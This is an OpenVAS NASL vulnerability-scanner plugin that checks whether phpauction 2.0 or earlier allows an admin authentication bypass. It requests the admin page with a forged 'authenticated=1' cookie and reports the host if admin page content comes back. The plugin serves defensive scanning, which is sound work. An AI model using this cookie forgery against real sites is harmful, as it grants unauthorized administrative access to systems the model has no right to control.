# OpenVAS Vulnerability Test
# $Id: phpauction_admin.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: phpauction Admin Authentication Bypass
#
# Authors:
# Tobias Glemser (tglemser@tele-consulting.com)
# thanks to George A. Theall and Dennis Jackson for helping writing this plugin
#
# Copyright:
# Copyright (C) 2005 Tobias Glemser (tglemser@tele-consulting.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19239");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(12069);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("phpauction Admin Authentication Bypass");

  script_category(ACT_ATTACK);

  script_copyright("(C) 2005 Tobias Glemser (tglemser@tele-consulting.com)");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to a version > 2.0 of this software and/or restrict access
  rights to the administrative directory using .htaccess.");

  script_tag(name:"summary", value:"The remote host is running phpauction prior or equal to 2.0 (or a modified
  version).

  There is a flaw when handling cookie-based authentication credentials which
  may allow an attacker to gain unauthorized administrative access to the
  auction system.");

  script_xref(name:"URL", value:"http://pentest.tele-consulting.com/advisories/04_12_21_phpauction.txt");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))
  exit(0);

foreach dir(make_list_unique( "/", "/phpauction", "/auction", "/auktion", cgi_dirs(port:port))) {

  if( dir == "/" )
    dir = "";

  url = dir + "/admin/admin.php";
  res = http_get_cache(item:url, port:port);

  if(!res || "settings.php" >< res || "durations.php" >< res || ("main.php" >< res && "<title>Administration</title>" >< res))
    continue;

  req = http_get(item:url, port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, '\r\nCookie: authenticated=1;', idx, idx);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res)
    continue;

  if("settings.php" >< res || "durations.php" >< res || ("main.php" >< res && "<title>Administration</title>" >< res)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);